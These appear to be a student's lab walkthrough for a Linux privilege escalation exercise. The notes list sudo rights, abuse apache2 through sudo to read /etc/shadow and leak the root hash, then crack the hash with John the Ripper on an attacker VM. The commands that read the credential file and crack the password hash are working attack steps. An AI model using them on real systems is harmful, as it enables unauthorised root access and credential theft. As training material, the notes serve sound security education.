**Detection**

Linux VM

1. In command prompt type: 
   
```
sudo -l
```

![[Pasted image 20240601213957.png]]

2. From the output, notice the list of programs that can run via sudo.

**Exploitation**

Linux VM

1. In command prompt type:

```
sudo apache2 -f /etc/shadow
```

![[Pasted image 20240601214041.png]]

2. From the output, copy the root hash.

Attacker VM

1. Open command prompt and type:

```
echo '[Pasted Root Hash]' > hash.txt
```

2. In command prompt type:

```
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```

![[Pasted image 20240601214424.png]]

3. From the output, notice the cracked credentials.

Answer the questions below

Click 'Completed' once you have successfully elevated the machine
